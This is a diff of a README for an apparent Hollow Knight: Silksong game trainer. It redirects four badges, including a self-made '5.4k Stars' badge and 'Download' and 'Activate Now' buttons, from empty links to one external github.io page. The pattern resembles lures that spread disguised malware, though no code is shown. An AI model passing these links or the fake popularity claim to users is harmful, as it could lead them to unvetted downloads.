@@ -11,10 +11,10 @@ This trainer isn’t about shortcuts—it’s about **control**. With adjustable
 \[!IMPORTANT]
 Using a trainer can alter the intended challenge of the game. For best results, save your original progress separately before activating.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 5.4k Stars](https://img.shields.io/badge/⭐️%205.4k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://hollow-knight-silksong-trainers.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://hollow-knight-silksong-trainers.github.io/.github/)
+[![⭐️ 5.4k Stars](https://img.shields.io/badge/⭐️%205.4k-Stars-yellow?style=for-the-badge\&logo=github)](https://hollow-knight-silksong-trainers.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=github)](https://hollow-knight-silksong-trainers.github.io/.github/)
 
 
 ---
